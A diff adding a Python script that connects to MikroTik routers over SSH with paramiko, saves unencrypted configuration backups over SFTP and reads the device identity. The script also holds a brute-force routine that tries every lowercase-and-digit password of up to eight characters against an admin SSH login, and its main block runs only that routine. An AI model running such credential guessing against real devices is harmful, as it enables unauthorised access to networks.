@@ -1,0 +1,64 @@
+import itertools
+import re
+import socket
+import string
+
+import paramiko
+
+
+class mikssh():
+    def connect(self, address, username, password):
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((address, int(22)))
+            s.shutdown(2)
+            self.ssh = paramiko.SSHClient()
+            self.ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+            self.ssh.connect(hostname=address, username=username, password=password)
+            remote = self.ssh.invoke_shell()
+            return (remote)
+        except paramiko.AuthenticationException:
+            print("Authentication failed when connecting to {}".format(address))
+        except Exception as e:
+            print(e)
+
+    def backup(self, name):
+        try:
+            rfile = '{}.backup'.format(name)
+            stdin, stdout, stderr = self.ssh.exec_command(
+                "/system backup save name={} dont-encrypt=yes".format(name) + "\n")
+            print("------------")
+            ftp_client = self.ssh.open_sftp()
+            ftp_client.get('/{}'.format(rfile), '/Users/pooria/Documents/Mikback/{}.backup'.format(name))
+            ftp_client.close()
+        except Exception as e:
+            print(e)
+
+    def generate_file_name(self, address):
+        try:
+            stdin, stdout, stderr = self.ssh.exec_command("/system identity print" + "\n")
+            output = stdout.read()
+            print(re.search(r'name:.*', str(output)).group())
+            identity = str(output).split('name: ')[1]
+            name = identity[:12] + '-' + str(address)
+            return (name)
+        except Exception as e:
+            print(e)
+
+    def guess_password(self):
+        chars = string.ascii_lowercase + string.digits
+        attempts = 0
+        for password_length in range(1, 9):
+            for guess in itertools.product(chars, repeat=password_length):
+                attempts += 1
+                guess = ''.join(guess)
+                res = self.connect("192.168.10.1", "admin", guess)
+                if res is not None:
+                    return 'password is {}. found in {} guesses.'.format(guess, attempts)
+                print(guess, attempts)
+
+
+if __name__ == '__main__':
+    mik = mikssh()
+    mik.guess_password()
+
